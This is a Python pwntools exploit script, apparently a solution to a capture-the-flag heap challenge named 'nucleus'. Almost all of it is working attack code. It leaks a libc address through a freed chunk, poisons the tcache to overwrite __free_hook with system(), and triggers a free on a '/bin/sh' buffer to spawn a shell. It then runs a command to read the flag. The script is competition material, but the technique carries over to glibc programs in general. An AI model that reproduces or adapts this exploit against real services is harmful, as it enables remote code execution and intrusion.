#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)

exe = ELF('./nucleus_patched')
libc = ELF('./libc.so.6')

host, port = "nucleus.nc.jctf.pro", "1337"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process(exe.path)

def free_c(idx):
  sla('> ', '3')
  sla(': ', 'c')
  sla('Idx: ',str(idx))

def free_d(idx):
  sla('> ', '3')
  sla(': ', 'd')
  sla('Idx: ',str(idx))

def show(idx):
  sla('> ', '5')
  sla('Idx: ',str(idx))
  return rcu('content: ', '\n')

def comp(text):
  sla('> ', '1')
  sla('text: ',text)

def decomp(text):
  sla('> ', '2')
  sla('text: ',text)

comp('a'*1022)
decomp('b'*24)
decomp('c'*24)
decomp('d'*24)

free_c(0)
# leak libc address
libc.address = u64(show(0).ljust(8,b'\x00'))-0x1ecbe0
logbase()

# prepare chunks for tcache poisonning attack
free_d(2)
free_d(1)
free_d(0)

# overwrite next chunk fd, with __free_hook address
decomp(b'$57\x41'+b'\x00'*7+ p64(libc.sym['__free_hook'])[0:8]+p64(0xdeadbeef))
# command to be executed
decomp('/bin/sh\x00'*3)
# execute tcache poisonning, will write system() address in __free_hook
decomp(p64(libc.sym['system'])*3)
# execute our command, gotshell
free_d(4)

sl('id;./readflag;echo')

p.interactive()